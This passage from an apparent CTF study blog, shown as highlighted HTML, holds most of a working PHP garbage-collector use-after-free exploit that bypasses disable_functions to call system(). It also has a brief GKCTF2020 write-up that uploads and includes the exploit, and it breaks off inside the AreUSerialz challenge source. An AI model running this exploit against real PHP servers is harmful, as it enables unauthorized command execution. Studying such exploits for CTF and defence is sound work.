        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token shell-comment comment"># </span><span class="token string">'constant'</span> constant check
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else continue;</span>

            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token shell-comment comment"># </span><span class="token string">'bin2hex'</span> constant check
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else continue;</span>

            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; # ELF header</span>
                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; # system</span>
                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; while($f_entry != 0);</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">class</span> <span class="token class-name">ryat</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">var</span> <span class="token variable">$ryat</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> <span class="token variable">$chtg</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">chtg</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># increase this value if you get segfaults</span>

    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string">'a:4:&amp;#123;i:0;i:1;i:1;a:1:&amp;#123;i:0;O:4:"ryat":2:&amp;#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&amp;#125;&amp;#125;i:1;i:3;i:2;R:5;&amp;#125;'</span><span class="token punctuation">;</span>
    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gc_collect_cycles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$out</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>
    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; &amp;#125;;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token shell-comment comment"># leaks</span>
    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>

    <span class="token shell-comment comment"># fake value</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token shell-comment comment"># fake reference</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token shell-comment comment"># fake closure object</span>
    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token shell-comment comment"># pwn</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func type</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func handler</span>

    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
</code></pre>
<p><strong>题目练习[GKCTF2020]CheckIN</strong></p>
<p>就贴关键点</p>
<p><img src="/images/60.png"></p>
<p>发现flag没有权限读取，所以应该是通过执行readflag来获取，但打开readflag是乱码。</p>
<p><img src="/images/61.png"></p>
<p>发现tmp，lock目录权限比较大，上传exp到该目录下，然后进行包含该exp文件来执行readflag就行。</p>
<p><img src="/images/62.png"></p>
<pre><code>include(&#39;/var/lock/fox.php&#39;);</code></pre>
<p><strong>php&gt;7.1对类的属性不敏感</strong></p>
<p><strong>网鼎杯2020[青龙组]–AreUSerialz</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if($this->op == </span><span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123; </span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
        <span class="token keyword">echo</span> <span class="token string">"[Result]:"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span> 
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
